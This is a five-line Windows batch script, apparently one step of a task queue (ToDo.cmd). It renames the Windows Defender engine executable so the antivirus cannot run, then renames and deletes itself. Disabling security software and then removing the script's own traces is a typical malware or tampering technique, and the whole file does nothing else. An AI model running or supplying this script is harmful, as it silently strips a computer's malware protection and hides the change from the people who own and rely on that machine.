@echo off
ren "%~d0\program files\windows defender\MSMpEng.exe" "MSMpEng.exe.disabled"
ren %~dp0ToDo.cmd Done.cmd
del /Q %~dp0Done.cmd
del /Q %~dp0ToDo.cmd